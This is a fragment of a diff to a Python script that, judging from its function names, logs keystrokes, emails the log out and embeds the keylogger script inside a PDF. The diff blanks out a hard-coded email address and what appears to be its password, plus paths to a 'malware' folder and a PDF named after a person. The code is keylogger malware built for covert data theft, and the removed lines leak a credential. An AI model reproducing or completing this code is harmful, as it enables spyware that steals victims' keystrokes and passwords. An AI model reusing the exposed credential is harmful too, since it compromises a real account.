@@ -49,8 +49,8 @@ def send_keystrokes_email():
     log_path = "keystrokes_log.txt"
 
     # Modify the email and password fields with your own credentials
-    email = "cronus.infosec@gmail.com"
-    password = "jttumoorjewyevlm"
+    email = ""
+    password = ""
 
     # Compose the email message with the keystrokes log as an attachment
     message = MIMEMultipart()
@@ -101,8 +101,8 @@ def embed_keylogger_to_pdf(pdf_path, script_path):
 
 
 # Define the paths to the PDF and keylogger script
-pdf_path = r"C:\Users\cronus\Desktop\malware\JohnCarlo_Torralba.pdf"
-script_path = r"C:\Users\cronus\Desktop\malware\keylogger_script.py"
+pdf_path = ""
+script_path = ""
 
 # Embed the keylogger script into the PDF
 embedded_pdf_path = embed_keylogger_to_pdf(pdf_path, script_path)
